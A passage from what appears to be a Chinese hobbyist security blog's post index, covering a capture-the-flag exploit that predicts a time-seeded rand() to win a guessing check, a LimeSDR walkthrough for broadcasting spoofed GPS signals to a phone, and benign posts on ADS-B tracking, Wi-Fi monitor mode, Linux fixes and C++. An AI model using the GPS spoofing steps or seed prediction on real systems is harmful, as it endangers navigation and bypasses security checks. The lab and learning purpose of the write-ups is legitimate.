time_info = localtime(&amp;seed); strftime(buf, 9uLL, "%H:%M:%S", time_info); printf("time: %s\n", buf); printf("plz guess my number:"); __isoc99_scanf("%u", &amp;num); if ( num == N ) system("/bin/cat ./flag"); else puts("sorry,try again!"); result = 0; v4 = *MK_FP(__FS__, 40LL) ^ v10; return result;&#125; 这个程序就是通过调用时间设为随机数的种子，生成的数字简单移位，判断生成的随机数与输入的数是否相同，如果相同输出flag.那么我写一个程序同样使用时间作为种子就可以预测它生成的随机数了。 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;time.h&gt;#include &lt;stdlib.h&gt;int main()&#123; int result; unsigned int num; unsigned int N; time_t seed; struct tm *time_info; char buf[9]; seed = time(NULL); srand(seed); N = rand()&gt;&gt;8; time_info = localtime(&amp;seed); strftime(buf,100,"%H:%M:%S\n",time_info); printf("time: %s\n",buf); printf("%u",N); return 0;&#125; rand()会返回的随机数值，srand()用来设置rand()产生随机数时的随机数种子。如果碰到随机种子是使用time()函数生成的情况，就可以考虑同步服务器时间，在某些情况绕过一个验证机制。]]></content>
  </entry>
  <entry>
    <title><![CDATA[接收ADS-B信号实现追踪飞机轨迹]]></title>
    <url>%2F2018%2F06%2F18%2F%E6%8E%A5%E6%94%B6ADS-B%E4%BF%A1%E5%8F%B7%E5%AE%9E%E7%8E%B0%E8%BF%BD%E8%B8%AA%E9%A3%9E%E6%9C%BA%E8%BD%A8%E8%BF%B9%2F</url>
    <content type="text"><![CDATA[开始本来之前是想用rtl-sdr来实现飞机轨迹的追踪，还没有玩过rtl-sdr,现在有更好的设备当然要试一试了。在通用航空当中ADS-B信号经常在978MHz发射，在商业飞行中ADS-B信号经常在1090MHz发射。有关于ADS-B信号的资料网上有很多，我这里就不写了。环境的安装就不写了，这次需要安装gr-airmodes和google earth.其实如果是hackrf这样的设备可以使用dump1090来搞定，但是貌似现在Limesdr还没有支持。 gr-air-modes下载编译安装12345678$ git clone https://github.com/bistromath/gr-air-modes.git$ cd gr-air-modes$ mkdir build$ cd build$ cmake ../$ make$ sudo make install$ sudo ldconfig apps/modes_rx: The main application.$ modes_rx --help google earth这个基本大家都玩过12wget http://dl.google.com/dl/earth/client/current/google-earth-stable_current_amd64.debsudo dpkg -i google-earth-stable_current_amd64.deb 根据https://cn0xroot.com/2016/11/17/exploring-the-wireless-world-with-usrp-part-1-aircraft-tracking-with-usrp/这篇文章，理论上./modex_rx -K test.kml就完事了。执行App目录下的modex_rx，开始接收并解码来自飞机的1090MHz无线信号，-K参数即把解码到的航班号、经纬度、飞行速度等等保存为.kml文件。但是，我这里就报错了。12345678910111213[INFO] [UHDSoapyDevice] LMS7002M calibration values caching DisableTraceback (most recent call last): File &quot;./modes_rx&quot;, line 99, in &lt;module&gt; main() File &quot;./modes_rx&quot;, line 58, in main tb = air_modes.modes_radio(options, context) File &quot;/usr/local/lib/python2.7/dist-packages/air_modes/radio.py&quot;, line 47, in __init__ self._setup_source(options) File &quot;/usr/local/lib/python2.7/dist-packages/air_modes/radio.py&quot;, line 179, in _setup_source self._u.set_time_now(uhd.time_spec(0.0)) File &quot;/usr/local/lib/python2.7/dist-packages/gnuradio/uhd/uhd_swig.py&quot;, line 2490, in set_time_now return _uhd_swig.usrp_source_sptr_set_time_now(self, *args, **kwargs)RuntimeError: SoapyLMS7::setHardwareTime() sample rate unset 关于这个报错我还没解决，之后尝试打开modes_gui，发现无法更改Rate。也无法正常运行。GitHub也有人提相同的问题，目前没有人回答。后来我找到了解决办法modes_rx --source=osmocom --kel=xxx.kml 打开Google earth，Add-&gt;Network Link-&gt;Link当中把xxx.kml的位置填进去。设定刷新时间，以及是否在刷新时前往该视图。 等一会就可以在地图上看到显示的航班号了，还可以显示飞行高度。 其他天线不行，在室内效果很一般，室外还行。 一个在线看飞机的网站https://zh.flightaware.com/live/ 理论上实现这个方法有很多,应该也可以直接采样1090MHz的频段数据,再导入其他软件进行分析.我就不测试了.]]></content>
  </entry>
  <entry>
    <title><![CDATA[GPS欺骗的简单实现]]></title>
    <url>%2F2018%2F06%2F18%2FGPS%E6%AC%BA%E9%AA%97%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[开始之前一直想尝试一下GPS欺骗，主要是没有工具无法实现。现在手头有Limesdr,搜索了一下进行了简单的测试，在我的一个老的安卓手机上测试成功。目前用的iPhone没有欺骗成功，暂时没有研究原因。 gps-sdr-simhttps://github.com/osqzss/gps-sdr-sim这是一个生成GPS信号文件的工具，需要用其他工具将信号文件发射出去。首先下载编译gps-sdr-sim123git clone https://github.com/osqzss/gps-sdr-sim.gitcd gps-sdr-simgcc gpssim.c -lm -O3 -o gps-sdr-sim RINEX星历数据ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily比如我下载的是ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily/2018/brdc/brdc1690.18g.Z下载之后需要解压。 RINEX文件命名规则前4位：四字符测站名5-7：年积日8：一天内的文件序号（时段号），0-9，A-Z，若为0，则表示文件包含当天的所有观测数据.1-2:两位年号最后一位：O:观测值N:星历M:气象数据G:GLONASS星历H:同步卫星GPS载荷的导航电文C:钟文件 LimeGPS光生成信号文件不行，要想办法发出去。翻了一些翻到一个工具LimeGPS.https://github.com/osqzss/LimeGPS安装和测试12345678$ sudo add-apt-repository -y ppa:myriadrf/drivers$ sudo apt-get update$ sudo apt-get install limesuite liblimesuite-dev limesuite-udev limesuite-images$ sudo apt-get install soapysdr soapysdr-module-lms7$ git clone https://github.com/osqzss/LimeGPS$ cd LimeGPS$ make$ ./LimeGPS -e brdc0350.18n 运行测试之后，理论上来讲不管是否欺骗成功，在手机上是可以看到虚假的GPS卫星信号的。我是通过GPS test软件查看的。如果顺利的话，这里就能够实现GPS欺骗了。动态的GPS轨迹我没有测试。 gps-sdr-sim-realtime之后我看到了这篇文章https://blog.csdn.net/fftt516/article/details/78062054?locationNum=1&amp;fps=1他介绍这个项目将gps-sdr-sim产生的数据用socket发送到一个特定的端口，然后在grc钟用TCP来接收这些数据，并通过Osmosdr Sink发射出去。同时实现了基于PyWeb用百度接口实现可视化的地图位置更改。git clone https://github.com/gym487/gps-sdr-sim-realtime.git打开文件夹可以看到tcp.grc,grc需要运行。gnuradio-companion tcp.grc需要根据设备修改一下。TCP Source 把端口改成2913osmocom Sink 当中Device Arguments: driver=lime,soapy=0Antenna 设为空 接下来运行一个本地的http server获取相应的GPS坐标，启动Server。cd mapserverpython mapper.py浏览器当中输入http://127.0.0.1:8080/static/baidumap.html就可以点击任何位置，点击之后就会自动更新数据。 ./gps-sdr-sim -e brdc1670.18n -n 2913 -v -d 3600 -w brdc为星历文件，-n TCP server接收方的端口 信号通过osmosdr sink -&gt; LimeSDR发射出去了 手机上就可以看到欺骗结果了，我测试虽然成功，但是并不稳定。目前没有时间仔细研究。就记录到这里。]]></content>
  </entry>
  <entry>
    <title><![CDATA[LimeSDR入手]]></title>
    <url>%2F2018%2F06%2F13%2FLimeSDR%E5%85%A5%E6%89%8B%2F</url>
    <content type="text"><![CDATA[现在手头有一块LimeSDR,那么就开始折腾，本来是根据https://cn0xroot.com/2017/04/12/limesdr-getting-started-quickly/这位大佬的教程去做的，但是中途会出现问题，只好自己找资料入手。 开始我就不介绍这块板子了，其实SDR我可能也要继续了解一下写点笔记，现在先记录一下基本的配置。我刚开始是按照上面网址的教程去做的，但是中间会出现问题，是驱动结构发生变化的原因，所以重新开始找配置的方法。最终找到这个结构，按这个配置。12HARDWARE | SOFTWARELimeSDR &lt;-&gt; LimeSuite &lt;-&gt; SoapyLMS7 &lt;-&gt; SoapySDR &lt;-&gt; SoapyUHD &lt;-&gt; UHD &lt;-&gt; Software using UHD 安装SoapySDR123sudo apt-get install \ cmake g++ \ libpython-dev python-numpy swig 123456789git clone https://github.com/pothosware/SoapySDR.gitcd SoapySDRmkdir buildcd buildcmake ..make -j4sudo make installsudo ldconfig #needed on debian systemsSoapySDRUtil --info 安装LimeSuite1234567891011121314151617181920212223242526sudo add-apt-repository -y ppa:myriadrf/driverssudo apt-get updatesudo apt-get install limesuite liblimesuite-dev limesuite-udev limesuite-imagessudo apt-get install soapysdr soapysdr-module-lms7#packages for soapysdr available at myriadrf PPAsudo add-apt-repository -y ppa:myriadrf/driverssudo apt-get update#install core library and build dependenciessudo apt-get install git g++ cmake libsqlite3-dev#install hardware support dependenciessudo apt-get install libsoapysdr-dev libi2c-dev libusb-1.0-0-dev#install graphics dependenciessudo apt-get install libwxgtk3.0-dev freeglut3-devgit clone https://github.com/myriadrf/LimeSuite.gitcd LimeSuitemkdir builddir &amp;&amp; cd builddircmake ../make -j4sudo make installsudo ldconfigcd LimeSuite/udev-rulessudo ./install.sh 安装UHD12345678910sudo apt-get install libboost-all-dev libusb-1.0-0-dev python-mako doxygen python-docutils cmake build-essentialgit clone git://github.com/EttusResearch/uhd.gitcd &lt;uhd-repo-path&gt;/hostmkdir buildcd buildcmake ../makemake testsudo make installsudo ldconfig 安装SoapyUHD1234567git clone https://github.com/pothosware/SoapyUHD.gitcd SoapyUHDmkdir buildcd buildcmake ..makesudo make install 安装SDR常用软件123456789101112sudo apt-get updatesudo apt-get install gitsudo apt-get install python-pippip install --upgrade pippip install git+https://github.com/gnuradio/pybombs.gitpybombs recipes add gr-recipes git+https://github.com/gnuradio/gr-recipes.git pybombs recipes add gr-etcetera git+https://github.com/gnuradio/gr-etcetera.gitpybombs prefix init /usr/local -a myprefix -R gnuradio-defaultpybombs install gqrx gr-osmosdr 使用gqrx的小问题开启的时候using the “other” setting with “driver=lime,soapy=0”天线选择一下就可以收到FM了，但是声音很小不知道是哪里的问题。]]></content>
  </entry>
  <entry>
    <title><![CDATA[AWUS036ACH网卡驱动问题]]></title>
    <url>%2F2018%2F06%2F11%2FAWUS036ACH%E7%BD%91%E5%8D%A1%E9%A9%B1%E5%8A%A8%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[问题到手一块AWUS036ACH网卡，不用说是干什么的了，就是驱动问题比较难解决。目前解决了在Ubuntu下正常使用，在Kali虚拟机里可以开启monitor模式。我查了一下，内置芯片是rtl8812AU,所以Ubuntu的驱动问题解决如下。 Ubuntu 先git下来git clone https://github.com/diederikdehaas/rtl8812AU.git 安装DKMSDKMS是一个自动编译和安装内核模块的工具sudo apt-get install dkms 安装驱动进入git的目录12345678DRV_NAME=rtl8812AUDRV_VERSION=4.3.20sudo mkdir /usr/src/$&#123;DRV_NAME&#125;-$&#123;DRV_VERSION&#125;sudo cp -Rf ~/Downloads/rtl8812AU-driver-4.3.20/* /usr/src/rtl8812AU-4.3.20/sudo dkms add -m $&#123;DRV_NAME&#125; -v $&#123;DRV_VERSION&#125;sudo dkms build -m $&#123;DRV_NAME&#125; -v $&#123;DRV_VERSION&#125;sudo dkms install -m $&#123;DRV_NAME&#125; -v $&#123;DRV_VERSION&#125;sudo modprobe 8812au 这样就能识别网卡了,但是开启monitor模式没有成功,需要有时间折腾. 卸载驱动dkms remove ${DRV_NAME}/${DRV_VERSION} --all KaliKali的问题是缺少内核头文件.apt-get install linux-headers-$(uname -r) 我这里是没有成功的,就必须查找可用的头进行安装apt-cache search linux-imageapt-cache search linux-headers 我这里根据提示安装了apt-get install linux-image-4.16.0-kali2-amd64apt-get install linux-headers-4.16.0-kali2-amd64reboot 安装驱动apt install realtek-rtl88xxau-dkmsrebootiwconfig就可以看到设备情况了. 使用问题 我试着使用airmon-ng start直接开始的时候出现了报错 123456789101112131415161718192021root@kali:~# airmon-ng start wlan0Found 4 processes that could cause trouble.If airodump-ng, aireplay-ng or airtun-ng stops working aftera short period of time, you may want to run &apos;airmon-ng check kill&apos;PID Name535 NetworkManager661 dhclient5256 wpa_supplicant5281 dhclientPHY Interface Driver Chipsetphy0 wlan0 8812au Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac WLAN Adaptercat: /sys/class/ieee80211/phy0/device/net/wlan0mon/type: No such file or directoryNewly created monitor mode interface wlan0mon is *NOT* in monitor mode.Removing non-monitor wlan0mon interface...WARNING: unable to start monitor mode, please run &quot;airmon-ng check kill&quot; 解决方案 1234root@kali:~# ip link set wlan0 downroot@kali:~# iwconfig wlan0 mode monitorroot@kali:~# ip link set wlan0 uproot@kali:~# airmon-ng 这样抓包就没有问题了，但是还是有很多问题暂时没解决。]]></content>
  </entry>
  <entry>
    <title><![CDATA[解决Ubuntu18.04坚果云问题]]></title>
    <url>%2F2018%2F06%2F05%2F%E8%A7%A3%E5%86%B3Ubuntu18-04%E5%9D%9A%E6%9E%9C%E4%BA%91%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[问题起因新装了Ubuntu 18.04,装好坚果云之后.登录提示SSL链接失败,本来都想换回16.04,后来找到了解决方案. JDK在安装坚果云时,会自动安装OpenJDK.问题可能出现在JDK上面.所以先卸载OpenJDK.sudo apt-get remove openjdk*下载ORACLE JDKhttp://www.oracle.com/technetwork/java/javase/downloads/jdk10-downloads-4416644.html解压tar zxvf jdk-10.interim.update.patch_linux-x64_bin.tar.gz 编辑.bashrc文件1234567#JAVAJAVA_HOME=/home/zz/Documents/jdk-10.0.1JRE_HOME=$JAVA_HOME/jreJAVA_BIN=$JAVA_HOME/binCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME PATH CLASSPATH source ~/.bashrc 做到这一步发现问题还是没有解决,看到网上的官方临时解决方案 123456备份并移除老的cacertssudo mv /etc/ssl/certs/java/cacerts&#123;,.backup&#125;生成新的cacertssudo keytool -importkeystore -destkeystore /etc/ssl/certs/java/cacerts -deststoretype jks -deststorepass changeit -srckeystore /etc/ssl/certs/java/cacerts.backup -srcstoretype pkcs12 -srcstorepass changeit 这步成功之后可以成功登录了,但是无法显示图标.安装TopIcons Plus. https://github.com/phocean/TopIcons-plus 12345sudo apt-get install makegit clone https://github.com/phocean/TopIcons-plus.gitcd TopIcons-plusmake installsudo make install INSTALL_PATH=/usr/share/gnome-shell/extensions reload GNOME Shell 在gnome-tweak-tool里面打开插件即可]]></content>
  </entry>
  <entry>
    <title><![CDATA[一次关于VPN报错的摸鱼]]></title>
    <url>%2F2018%2F06%2F02%2F%E4%B8%80%E6%AC%A1%E5%85%B3%E4%BA%8EVPN%E6%8A%A5%E9%94%99%E7%9A%84%E6%91%B8%E9%B1%BC%2F</url>
    <content type="text"><![CDATA[起因现在这个博客懒得申请图床，其他方式插入图片也太麻烦，所以纯文字记录啦。事情的起因是发现了一次VPN报错，VPN报错提示很简单。The VPN Service is not acailable. 通过这个报错去寻找VPN服务是否开启，如果这么简单就解决了，就没有后面的事了。问题的解决方案最后也很简单，一条netsh winsock reset就解决了。但是探究问题产生的原因是这次摸鱼的开始。并且发现这个问题与之前碰到的在开机以后提示你的电脑将在一分钟后自动重启本质上原因是一样的。 分析一下通过netsh winsock reset命令解决表明windows的winsock出现错误。那么猜测是LSP出现的问题。并且通过Autoruns软件发现了TGP创建了LSP的相关注册表项。 Autorunshttps://docs.microsoft.com/zh-cn/sysinternals/downloads/autoruns官方的简单介绍This utility, which has the most comprehensive knowledge of auto-starting locations of any startup monitor, shows you what programs are configured to run during system bootup or login, and when you start various built-in Windows applications like Internet Explorer, Explorer and media players. These programs and drivers include ones in your startup folder, Run, RunOnce, and other Registry keys. Autoruns reports Explorer shell extensions, toolbars, browser helper objects, Winlogon notifications, auto-start services, and much more. Autoruns goes way beyond other autostart utilities. LSP维基相关介绍https://en.wikipedia.org/wiki/Layered_Service_ProviderLayered Service Provider (LSP) is a deprecated feature of the Microsoft Windows Winsock 2 Service Provider Interface (SPI). A Layered Service Provider is a DLL that uses Winsock APIs to attempt to insert itself into the TCP/IP protocol stack. Once in the stack, a Layered Service Provider can intercept and modify inbound and outbound Internet traffic. It allows processing of all the TCP/IP traffic taking place between the Internet and the applications that are accessing the Internet (such as a web browser, the email client, etc.).其中的缺点很关键。划一下重点Another major common issue with LSPs was that if they were to be removed or unregistered improperly or if the LSP was buggy, it would result in corruption of the Winsock catalog in the registry, and the entire TCP/IP stack would break and the computer could no longer access the network. TGP通过Autotuns软件中的Winsock Providers选项中，可以看到HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entires和HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries64注册表中有TGP写入的ierd_tgp_lsp开头的相关信息。指向c:\windows\syswow64\ierd_tgp_lsp.dll 以及ierd_tgp_lsp64.dll由LSP的功能推测，这个dll会在与网络加速相关功能的时候启用。那么接下来就开始复现错误，接下来的操作在一台全新的Win10 1804虚拟机下进行。 复现刚安装好wegame的时候，autotuns中看到是没有LSP注册表修改的，在使用一次网络加速功能后，注册表就增加了相关注册表项。那么如何判断ierd_tgp_lsp.dll是否被使用呢？我首先用了Process Explorer工具进行dll的搜索。没有开启游戏前没有进程与之相关，在开启后发现有三四个进程（其中一些是系统进程）与之相关。推测与网络相关进程都被注入，注入细节目前搞不清楚，尝试过逆向dll，水平有限没搞懂。dll问题先暂时放在一边，问题的原因是Winsock被破坏，那么如何观察winsock的情况是一个问题。这个问题的解决也比较简单，参见https://support.microsoft.com/zh-cn/help/811259/how-to-determine-and-to-recover-from-winsock2-corruption-in-windows-se介绍的方法是使用Msinfo32程序。123456789101112131415161718192021单击“开始”，单击“运行”，键入“Msinfo32”，然后单击“确定”。依次展开“组件”和“网络”，然后单击“协议”。“协议”下将显示 10 个节。如果 Winsock2 项未损坏，则节标题中将包括下列名称：MSAFD Tcpip [TCP/IP]MSAFD Tcpip [UDP/IP]MSAFD Tcpip [TCP/IPv6]MSAFD Tcpip [UDP/IPv6] RSVP UDP Service ProviderRSVP TCP Service ProviderRSVP UDPv6 Service Provider RSVP TCPv6 Service Provider MSAFD NetBIOS [\Device\NetBT_Tcpip... MSAFD NetBIOS [\Device\NetBT_Tcpip... MSAFD NetBIOS [\Device\NetBT_Tcpip... MSAFD NetBIOS [\Device\NetBT_Tcpip... MSAFD NetBIOS [\Device\NetBT_Tcpip... MSAFD NetBIOS [\Device\NetBT_Tcpip... 如果显示的名称与此列表中的名称有任何不同，则说明 Winsock2 项已损坏，或安装了第三方加载项（如代理软件）。如果安装了第三方加载项，则该加载项的名称将替代列表中的字母“MSAFD”。 如果列表中的节数多于 10 个，则说明安装了第三方加载项。 如果少于 10 个，则说明缺少信息。 在没有开启加速器之前，我的系统上第一项显示AF_UNIX,之后显示MSAFD Tcpip [TCP/IP],MSAFD Tcpip [UDP/IP]等等.在开启加速后，第一项显示ierd_tgp_lsp64 over [MSAFD Tcpip [TCP/IP]],第二项显示ierd_tgp_lsp64 over [MSAFD Tcpip [UDP/IP]]. 很明显修改了相关信息，在正常退出TGP时，信息会恢复原状，但是DLL仍然与进程相关，在重启后无关。那么是否非正常退出TGP时会发生问题，答案是肯定的，信息并没有被修改回原来的情况。但是重启后并没有碰到VPN的问题，重启后发现联网的程序都挂上了lspdll,正常情况下重启是没有的。32位的程序挂32位的dll,64位的程序挂64位的，程序的网络通信正常，系统也正常运作。但是Winsock中的信息并没有被修改回来。（我推测是TX的程序员做的容错机制，即使异常也不会发生明显的错误，在下次正常运行程序时可以被修改回来，但是这种容错机制似乎是有点权限过大，还没有仔细研究） 现在的问题就是如何复现VPN的问题，根据这个思路下去，既然联网的程序都要调用tgp给的lspdll.那么就把DLL文件删除，当然不是那么容易删的。因为它一直是被使用的状态，我就通过进入PE系统将两个DLL文件改名。再进入系统时，运行VPN就出现了最开始出现的错误。这时运行netsh winsock reset解决问题也就很顺理成章了。 ARK我还是想要细致探究一下，所以想借助ARK类工具(AntiRootkit)。但是发现64位系统运行ARK工具并不是很方便，于是又开了一台Win7 32位的虚拟机继续研究。 基本进行相同的操作，发现在异常操作后，lspdll其实是在winsock供应者启动项中（一直在启动项中）。这下之前的情况就说得通了。然后我用Antispy将相关启动项关闭，发现系统启动都出现了问题，黑屏无法进入系统。那么可以推测问题产生的一种原因是异常关闭TGP之后，电脑中的相关安全或优化程序将启动项优化。 其实本来想尝试一下内存监控的，有一点复杂。其实到最后对问题产生的原因也是猜测和推测，只有到具体出错的情况时再进行分析是最准确的，今天只做了个简单的复现和分析。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux树莓派NOOBS安装]]></title>
    <url>%2F2018%2F05%2F31%2FNOOBS%2F</url>
    <content type="text"><![CDATA[记一个笔记,在Linux环境下把树莓派的NOOBS折腾进去. 首先初始化SD卡1sudo fdisk -l 12345678910Disk /dev/sdb: 14.9 GiB, 15931539456 bytes, 31116288 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0xf9362f7aDevice Boot Start End Sectors Size Id Type/dev/sdb1 8192 93236 85045 41.5M c W95 FAT32 (LBA)/dev/sdb2 94208 31116287 31022080 14.8G 83 Linux 出现这个,这个是我的Pi使用过sd卡,所以会有两个分区.现在要将两个分区擦除. 1sudo fdisk /dev/sdb 123456789101112131415161718192021222324Welcome to fdisk (util-linux 2.31.1).Changes will remain in memory only, until you decide to write them.Be careful before using the write command.Command (m for help): dPartition number (1,2, default 2): 1Partition 1 has been deleted.Command (m for help): pDisk /dev/sdb: 14.9 GiB, 15931539456 bytes, 31116288 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0xf9362f7aDevice Boot Start End Sectors Size Id Type/dev/sdb2 94208 31116287 31022080 14.8G 83 LinuxCommand (m for help): dSelected partition 2Partition 2 has been deleted. 这样就把两个分区都删除了. 现在创建一个新的分区1234567891011121314151617181920Command (m for help): nPartition type p primary (0 primary, 0 extended, 4 free) e extended (container for logical partitions)Select (default p):Using default response p.Partition number (1-4, default 1):First sector (2048-31116287, default 2048):Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (2048-31116287, default 31116287):Created a new partition 1 of type &apos;Linux&apos; and of size 14.9 GiB.Command (m for help): pDisk /dev/sdb: 14.9 GiB, 15931539456 bytes, 31116288 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0xf9362f7a 分区类型不是Linux FAT32.t命令改变,选择b. 12345678910111213141516171819202122232425262728293031Command (m for help): tSelected partition 1Hex code (type L to list all codes): l 0 Empty 24 NEC DOS 81 Minix / old Lin bf Solaris 1 FAT12 27 Hidden NTFS Win 82 Linux swap / So c1 DRDOS/sec (FAT- 2 XENIX root 39 Plan 9 83 Linux c4 DRDOS/sec (FAT- 3 XENIX usr 3c PartitionMagic 84 OS/2 hidden or c6 DRDOS/sec (FAT- 4 FAT16 &lt;32M 40 Venix 80286 85 Linux extended c7 Syrinx 5 Extended 41 PPC PReP Boot 86 NTFS volume set da Non-FS data 6 FAT16 42 SFS 87 NTFS volume set db CP/M / CTOS / . 7 HPFS/NTFS/exFAT 4d QNX4.x 88 Linux plaintext de Dell Utility 8 AIX 4e QNX4.x 2nd part 8e Linux LVM df BootIt 9 AIX bootable 4f QNX4.x 3rd part 93 Amoeba e1 DOS access a OS/2 Boot Manag 50 OnTrack DM 94 Amoeba BBT e3 DOS R/O b W95 FAT32 51 OnTrack DM6 Aux 9f BSD/OS e4 SpeedStor c W95 FAT32 (LBA) 52 CP/M a0 IBM Thinkpad hi ea Rufus alignment e W95 FAT16 (LBA) 53 OnTrack DM6 Aux a5 FreeBSD eb BeOS fs f W95 Ext&apos;d (LBA) 54 OnTrackDM6 a6 OpenBSD ee GPT10 OPUS 55 EZ-Drive a7 NeXTSTEP ef EFI (FAT-12/16/11 Hidden FAT12 56 Golden Bow a8 Darwin UFS f0 Linux/PA-RISC b12 Compaq diagnost 5c Priam Edisk a9 NetBSD f1 SpeedStor14 Hidden FAT16 &lt;3 61 SpeedStor ab Darwin boot f4 SpeedStor16 Hidden FAT16 63 GNU HURD or Sys af HFS / HFS+ f2 DOS secondary17 Hidden HPFS/NTF 64 Novell Netware b7 BSDI fs fb VMware VMFS18 AST SmartSleep 65 Novell Netware b8 BSDI swap fc VMware VMKCORE1b Hidden W95 FAT3 70 DiskSecure Mult bb Boot Wizard hid fd Linux raid auto1c Hidden W95 FAT3 75 PC/IX bc Acronis FAT32 L fe LANstep1e Hidden W95 FAT1 80 Old Minix be Solaris boot ff BBTHex code (type L to list all codes): bChanged type of partition &apos;Linux&apos; to &apos;W95 FAT32&apos;. 最后w命令将新分区写入SD卡. 12345678910111213Command (m for help): pDisk /dev/sdb: 14.9 GiB, 15931539456 bytes, 31116288 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0xf9362f7aDevice Boot Start End Sectors Size Id Type/dev/sdb1 2048 31116287 31114240 14.9G b W95 FAT32Command (m for help): wThe partition table has been altered. 做到这步还没有格式化 1sudo mkfs.vfat /dev/sdb1 格式化完成后,把SD卡重新插拔一下. 1234mount | grep -i sdb1/dev/sdb1 on /media/zz/E8E3-71A1 type vfat (rw,nosuid,nodev,relatime,uid=1000,gid=1000,fmask=0022,dmask=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,showexec,utf8,flush,errors=remount-ro,uhelper=udisks2)cd /media/zz/E8E3-71A1/unzip /home/zz/NOOBS_v2_8_1.zip 然后找到它的位置,通过unzip命令直接解压到SD卡.12cdsudo umount /dev/sdb1 最后卸载.]]></content>
  </entry>
  <entry>
    <title><![CDATA[C++类和对象笔记]]></title>
    <url>%2F2018%2F05%2F30%2FC-%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[内联成员函数 内联成员函数 inline + 成员函数 整个函数体出现在类定义内部1234567class B&#123; inline void func1(); void func2() &#123; &#125;;&#125;;void B::func1()&#123;&#125; 成员函数的重载及参数缺省 重载成员函数 成员函数——带缺省参数 123456789101112131415161718192021#include &lt;iostream&gt;using namespace std;class Location&#123; private: int x,y; public: void init(int x = 0, int y = 0); void valueX( int val) &#123; x = val;&#125; int valueX()&#123; return x;&#125;&#125;;void Location::init( int X, int Y)&#123; x = X; y = Y;&#125;int main()&#123; Location A; A.init(5); A.valueX(5); cout&lt;&lt;A.valueX(); return 0;&#125; 使用缺省参数要注意避免有函数重载时的二义性 12345678910class Location &#123; private: int x, y; public: void init( int x = 0, int y = 0); void valueX( int val = 0)&#123; x = val;&#125; int value() &#123;return x;&#125;&#125;; Location A; A.valueX();// error 复制构造函数(copy constructor) 只有一个参数，即对同类对象的引用 形如 X::X(X&amp;) 或 X::X(const X &amp;),二者选一后者能以常亮对象作为参数 如果没有定义复制构造函数，那么编译器生成默认复制构造函数。默认的复制构造函数完成复制功能。 1234567891011class Complex &#123; private: double real,imag;&#125;;Complex c1; //调用缺省无参构造函数Complex c2(c1);//调用缺省的复制构造函数,将 c2 初始化成和c1一样 如果定义自己的复制构造函数，则默认的复制构造函数不存在。 1234567891011121314class Complex &#123; public : double real,imag; Complex()&#123; &#125; Complex( const Complex &amp; c ) &#123; real = c.real; imag = c.imag; cout &lt;&lt; “Copy Constructor called”; &#125;&#125;;Complex c1;Complex c2(c1);//调用自己定义的复制构造函数，输出 Copy Constructor called 不允许有形如 X::X(X)的构造函数 123456789class CSample&#123; CSample(CSample c)&#123; &#125;//不允许这样的构造函数&#125;;### 复制构造函数起作用的三种情况* 当用一个对象去初始化同类的另一个对象时```cppcomplex c2(c1);complex c2 = c1;//初始化语句，非赋值语句 如果某个函数有一个参数是类A的对象，那么该函数被调用时，类A的复制构造函数将被调用。 1234567891011121314class A&#123; public: A()&#123;&#125;; A(A &amp; a)&#123; cout &lt;&lt; "Copy constructor called"&lt;&lt;endl; &#125;&#125;;void Func(A a1)&#123;&#125;int main()&#123; A a2; Func(a2); return 0;&#125; 如果函数的返回值是类A的对象时，则函数返回时，A的复制构造函数被调用 123456789101112131415161718class A&#123; public: int v; A(int n)&#123; v = n;&#125;; A(const A &amp; a)&#123; v = a.v; cout&lt;&lt;"Copy constructor called" &lt;&lt;endl; &#125;&#125;;A Func()&#123; A b(4); return b;&#125;int main()&#123; cout&lt;&lt;Func().v&lt;&lt;endl; return 0;&#125; 类型转换构造函数 目的：实现类型的自动转换 特点：只有一个参数，不是复制构造函数 编译系统会自动调用-转换构造函数建立一个 临时对象/临时变量123456789101112131415161718192021class Complex&#123; public: double real, imag; Complex( int i )&#123; cout&lt;&lt;"IntConstructor called"&lt;&lt;endl; real = i; imag = 0; &#125; Complex( double r, double i) &#123; real = r; imag = i; &#125;&#125;;int main()&#123; Complex c1(7,8); Complex c2 = 12; c1 = 9; cout &lt;&lt; c1.real &lt;&lt; "," &lt;&lt; c1.imag &lt;&lt;endl; return 0;&#125; 析构函数(Destructor) 成员函数的一种 名字与类名相同 在前面加~ 没有参数和返回值 一个类最多只有一个析构函数 对象消亡时，自动被调用 在对象消亡前做善后工作 释放分配的空间等 定义类时没写析构函数，则编译器生成缺省析构函数 不涉及释放用户申请的内存释放等清理工作 定义了析构函数,则编译器不生成缺省析构函数123456789101112class String&#123; private: char* p; public: String()&#123; p = new char[10]; &#125; ~String();&#125;;String::~String()&#123; delete []p;&#125; 析构函数和数组 对象数组生命期结束时对象数组的每个元素的析构函数都会被调用123456789class Ctest&#123; public: ~Ctest()&#123; cout &lt;&lt;"destructor 